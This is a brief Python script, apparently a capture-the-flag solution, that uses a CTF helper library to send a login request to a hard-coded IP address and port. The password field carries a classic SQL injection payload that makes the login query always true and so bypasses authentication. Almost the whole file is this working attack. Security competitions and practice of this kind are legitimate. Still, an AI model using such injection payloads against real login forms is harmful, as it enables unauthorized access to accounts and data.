from CTF_Library import *

handler = URL_request_handler("http://155.248.210.243:42380/")

print(handler.post(["login"], {"username": "roo", "password": "k\' OR 1=1 --"}).text)
